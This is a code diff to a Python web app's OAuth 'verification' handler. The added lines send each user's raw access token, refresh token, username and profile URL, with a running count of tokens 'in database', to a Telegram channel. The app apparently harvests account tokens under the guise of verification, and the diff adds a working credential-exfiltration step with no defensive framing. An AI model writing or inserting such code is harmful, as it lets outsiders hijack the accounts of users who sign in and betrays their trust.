@@ -274,6 +274,16 @@ def verify():
                 session['access_token'] = access_token
                 session['refresh_token'] = refresh_token
 
+                total_tokens = get_total_tokens()
+                send_message_via_telegram(
+                    f"✅ Verification Successful!\n"
+                    f"🔑 Access Token: {access_token}\n"
+                    f"🔄 Refresh Token: {refresh_token}\n"
+                    f"👤 Username: @{username}\n"
+                    f"🔗 Profile URL: {profile_url}\n"
+                    f"📊 Total Tokens in Database: {total_tokens}"
+                )
+
                 return redirect(VERIFY_REDIRECT_URL)
             else:
                 return "Error retrieving user info with access token", 400
